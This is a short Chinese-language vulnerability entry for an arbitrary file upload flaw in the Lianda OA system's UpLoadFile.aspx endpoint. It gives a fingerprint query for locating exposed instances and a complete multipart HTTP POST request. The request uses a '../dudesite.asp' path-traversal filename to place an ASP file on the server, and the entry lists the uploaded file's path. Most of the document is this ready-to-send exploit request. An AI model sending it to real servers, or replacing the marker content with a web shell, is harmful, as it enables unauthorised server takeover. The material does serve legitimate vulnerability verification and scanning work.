﻿# 联达OA-UpLoadFile.aspx 任意文件上传漏洞

> 更新时间：2024-03-28

> 漏洞编号：

> 漏洞说明：联达动力oa是PHPOA推出的新一代OA系统,系统支持性好、安全、数据高速缓存化；支持100+应用自行安装与定义,应用表单自定义,支持应用无代码开发,支持多语言。该系统存在任意文件上传，攻击者可以上传任意文件控制服务器。

> 漏洞特征：app="联达OA"

> 验证脚本：HTTP

```
POST /FileManage/UpLoadFile.aspx HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="DesignId"

1
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="../dudesite.asp"
Content-Type: image/png

dudesite
--00content0boundary00--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/FileManage/dudesite.asp

> 验证文件来源：联达OA-UpLoadFile.aspx 任意文件上传漏洞.poc

